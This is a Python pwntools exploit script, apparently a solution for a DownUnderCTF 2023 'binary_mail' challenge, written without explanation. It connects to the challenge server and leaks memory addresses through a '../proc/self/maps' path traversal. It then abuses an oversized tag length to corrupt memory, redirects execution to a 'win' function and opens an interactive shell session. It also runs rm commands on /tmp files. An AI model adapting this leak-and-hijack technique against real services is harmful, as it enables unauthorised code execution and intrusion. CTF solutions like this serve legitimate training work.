#!/usr/bin/env python3

from pwn import *
import os

exe = ELF("binary_mail_patched")

context.binary = exe

TAG_RES_MSG      = 0  
TAG_RES_ERROR    = 1
TAG_INPUT_REQ    = 2
TAG_INPUT_ANS    = 3
TAG_COMMAND      = 4
TAG_STR_PASSWORD = 5
TAG_STR_FROM     = 6
TAG_STR_MESSAGE  = 7

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("2023.ductf.dev", 30011)

    return r

r = conn()

sla = lambda a,b : r.sendlineafter(a,b)
sl = lambda a : r.sendline(a)
se = lambda a : r.sendline(a)
ru = lambda a : r.recvuntil(a)

password = b'lollollol'

def build_tag(tag, length):
    ret = p32(tag)
    ret += p64(length)
    return ret

def parse_tag(raw):
    tag = u32(raw[0:4])
    length = u64(raw[4:12])
    return tag,length

def respond_input(msg, length=0):
    if length:
        tag = build_tag(TAG_INPUT_ANS, length)
    else:
        tag = build_tag(TAG_INPUT_ANS, len(msg)+1)
    sl(tag + msg)

def send_cmd(cmd):
    tag = build_tag(TAG_COMMAND, len(cmd)+1)
    sl(tag + cmd)

def register(first=False, username=b'chefchef', password=b'lollollol'):
    send_cmd(b'register')
    ru(b'username')
    respond_input(username)
    if first:
        ru(b'password')
        respond_input(password)

def viewmail(username=b'chefchef', password=b'lollollol', parse=False):
    send_cmd(b'view_mail')
    ru(b'username')
    respond_input(username)
    ru(b'password')
    respond_input(password)
    #the rest just prints the mail?
    if parse:
        raw = r.recvuntil(b'from: ', drop=True)
        tag, length = parse_tag(raw[-12:])
        log.info(f"message: {r.recv(length)}")
    

def sendmail(recvier,msg,username=b'chefchef', password=b'lollollol'):
    send_cmd(b'send_mail')
    ru(b'username')
    respond_input(username)
    if password == b'':
        return
    ru(b'password')
    respond_input(password)
    ru(b'recipient')

    tag = build_tag(TAG_INPUT_ANS, len(recvier)+1)
    if len(username) > len(recvier):
        tag = build_tag(TAG_INPUT_ANS, len(username)+1)
        recvier += b"\x00"*(len(username)-len(recvier))
    sl(tag + recvier)

    ru(b'message')
    respond_input(msg)

def main():
    #gdb.attach(r, gdbscript="b *win")
    os.system("rm /tmp/chefchef*")
    os.system("rm /tmp/helphel*")
    register(first=True)
    register(first=True, username=b'helphelpp', password=b'help')

    #sendmail(b'help\n', b'please get to work')

    send_cmd(b'send_mail')
    tag = build_tag(TAG_INPUT_ANS, 17)
    tag2 = build_tag(TAG_INPUT_ANS, 5)
    tag += b"../proc/self/maps"
    tag += tag2
    tag += b"chef"
    sl(tag)
    ru(b'taglen ')
    leak1 = p32(int(r.recvuntil(b' ', drop=True)))
    leak2 = p64(int(r.recv()))
    leak = int(leak1 + leak2, 16)
    log.info(f"{hex(leak)}")

    win = leak + 0x126a

    #idea, create a string of fake messages
    send_cmd(b'send_mail')
    ru(b'username')
    respond_input(b'chefchef\n\x00'+build_tag(TAG_STR_MESSAGE, 0xFFFFFFFFFFFFFFF9))
    ru(b'password')
    respond_input(b'lollollol')
    payload = b"helphelpp"
    respond_input(payload)
    respond_input(b'A'+p64(leak+0x4500)*126)
    #send_cmd(b"register")
    #sl(build_tag(TAG_INPUT_ANS, 0xFFFFFFFFFFFFFFFF))
    sendmail(b'helphelpp', b'BBBBBB' + p64(leak+0x1482)*0x40 + p64(win))
    viewmail(b'helphelpp', b'help')
    r.interactive()

if __name__ == "__main__":
    main()
